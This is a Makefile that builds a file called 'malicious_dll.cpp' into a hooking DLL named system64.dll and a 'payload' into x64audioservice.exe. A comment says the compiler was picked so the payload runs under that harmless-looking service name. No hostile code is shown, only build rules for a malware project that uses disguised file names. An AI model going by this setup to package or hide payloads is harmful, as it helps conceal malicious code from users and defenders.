#Compiler: MinGW64 g++
CXX = C:\MinGW\bin\g++.exe
# 32 bit compiler cuz mingw64 causes the payload to execute as "posix threads for windows" not as "x64audioservice.exe", idk why lol
CPP = C:\mingw32\bin\g++.exe

#Includes: winsdk and contents of lib folder (for easyhook)
INC = -IC:\winsdk\Include\10.0.17763.0 -Ilib

# Options for compiling dll
OPT = -mwindows -fpermissive -o system64.dll -shared -w

# Libraries for dll
LIB = -Llib -static -lEasyHook64 -lEasyHook32

# Global options (for both), including hacks for mingw64 to not add weird dll dependencies
GLOBOPT = -std=c++11 -static-libgcc -static-libstdc++ -Wl,-Bstatic,--whole-archive -lwinpthread -Wl,--no-whole-archive

default: both

dll:
	${CXX} ${INC} ${GLOBOPT} ${OPT} malicious_dll.cpp ${LIB}
	 
payload:
	${CPP} -o x64audioservice.exe -std=c++11 -static-libgcc -static-libstdc++ payload.cpp 

both: dll payload